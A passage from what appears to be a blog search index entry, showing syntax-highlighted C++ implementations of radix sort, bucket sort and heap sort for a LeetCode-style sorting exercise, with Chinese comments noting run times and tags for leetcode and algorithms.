class="token number">10</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">rank</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> base <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>maxd <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            count<span class="token punctuation">.</span><span class="token function">assign</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>                count<span class="token punctuation">[</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">/</span>base<span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token operator">++</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">10</span><span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>                count<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span><span class="token operator">=</span> count<span class="token punctuation">[</span>i<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> n<span class="token number">-1</span><span class="token punctuation">;</span> i <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token operator">--</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>                rank<span class="token punctuation">[</span><span class="token operator">--</span>count<span class="token punctuation">[</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">/</span>base<span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>                nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> rank<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            maxd<span class="token operator">--</span><span class="token punctuation">;</span>            base <span class="token operator">*</span><span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> nums<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// 桶排序 (20 ms)</span>    vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token function">bucketSort</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> n <span class="token operator">=</span> nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> maxv <span class="token operator">=</span> <span class="token operator">*</span><span class="token function">max_element</span><span class="token punctuation">(</span>nums<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> nums<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> minv <span class="token operator">=</span> <span class="token operator">*</span><span class="token function">min_element</span><span class="token punctuation">(</span>nums<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> nums<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> bs <span class="token operator">=</span> <span class="token number">1000</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> m <span class="token operator">=</span> <span class="token punctuation">(</span>maxv<span class="token operator">-</span>minv<span class="token punctuation">)</span><span class="token operator">/</span>bs<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>        vector<span class="token operator">&lt;</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token operator">></span> <span class="token function">bucket</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>            bucket<span class="token punctuation">[</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">-</span>minv<span class="token punctuation">)</span><span class="token operator">/</span>bs<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">int</span> idx <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> m<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">int</span> sz <span class="token operator">=</span> bucket<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            bucket<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">quickSort</span><span class="token punctuation">(</span>bucket<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> sz<span class="token punctuation">;</span> <span class="token operator">++</span>j<span class="token punctuation">)</span> <span class="token punctuation">{</span>                nums<span class="token punctuation">[</span>idx<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> bucket<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> nums<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// 堆排序（32 ms）</span>    <span class="token keyword">void</span> <span class="token function">adjust</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">,</span> <span class="token keyword">int</span> p<span class="token punctuation">,</span> <span class="token keyword">int</span> s<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">*</span>p<span class="token operator">+</span><span class="token number">1</span> <span class="token operator">&lt;</span> s<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">int</span> c1 <span class="token operator">=</span> <span class="token number">2</span><span class="token operator">*</span>p<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>            <span class="token keyword">int</span> c2 <span class="token operator">=</span> <span class="token number">2</span><span class="token operator">*</span>p<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">;</span>            <span class="token keyword">int</span> c <span class="token operator">=</span> <span class="token punctuation">(</span>c2<span class="token operator">&lt;</span>s <span class="token operator">&amp;&amp;</span> nums<span class="token punctuation">[</span>c2<span class="token punctuation">]</span><span class="token operator">></span>nums<span class="token punctuation">[</span>c1<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> c2 <span class="token operator">:</span> c1<span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>nums<span class="token punctuation">[</span>c<span class="token punctuation">]</span> <span class="token operator">></span> nums<span class="token punctuation">[</span>p<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token function">swap</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>c<span class="token punctuation">]</span><span class="token punctuation">,</span> nums<span class="token punctuation">[</span>p<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">else</span> <span class="token keyword">break</span><span class="token punctuation">;</span>            p <span class="token operator">=</span> c<span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token function">heapSort</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> n <span class="token operator">=</span> nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> n<span class="token operator">/</span><span class="token number">2</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token operator">--</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">adjust</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> i<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> n<span class="token number">-1</span><span class="token punctuation">;</span> i <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token operator">--</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">swap</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">adjust</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> nums<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 编程算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> leetcode </tag>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
